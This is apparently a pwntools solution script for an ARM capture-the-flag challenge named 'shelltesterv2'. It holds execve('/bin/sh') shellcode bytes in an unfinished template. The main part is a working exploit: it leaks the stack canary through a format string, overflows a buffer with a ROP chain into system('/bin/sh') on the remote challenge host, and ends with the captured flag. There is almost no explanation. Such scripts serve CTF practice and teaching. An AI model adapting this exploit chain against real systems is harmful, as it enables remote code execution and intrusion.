from pwn import *


def con(argv=[], *a, **kw):
	if args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	elif args.GDB:
		return gdb.debug(exe, gdbscript='''
			b 
			c
			''')
	else:
		return process(exe)


exe = './chal'
io = con()
elf = context.binary = ELF(exe, checksec = False)

context.log_level = 'info'

buf =  b""
buf += b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0a\x30"
buf += b"\x01\x90\x01\xa9\x92\x1a\x0b\x27\x01\xdf\x2f\x62"
buf += b"\x69\x6e\x2f\x73\x68"



# answer

from pwn import *

context.log_level = "INFO"

canary_leak = b"%43$p %44$p"
#io = process(["./qemu-arm-static", "chall"])
io = remote("shelltesterv2.challs.csc.tf", 1337)

io.recvuntil(b"Tell me something: \n")
io.sendline(canary_leak)

leaks = io.recvline().strip().split()
canary = int(leaks[0], 16)
saved_fp = int(leaks[1], 16)


SYSTEM = 0x0105b4
BINSH = 0x072688

print("CANARY:", hex(canary))
print("Saved FP:", hex(saved_fp))

# pop r0, r4, pc 
POP = 0x27194

payload = b"a" * 100 
payload += p32(canary)
payload += p32(saved_fp)
payload += p32(POP)
payload += p32(BINSH)
payload += p32(0)
payload += p32(SYSTEM)
io.sendline(payload)

io.interactive()

# CSCTF{4rm_pwn_1s_c00l_r1ght?}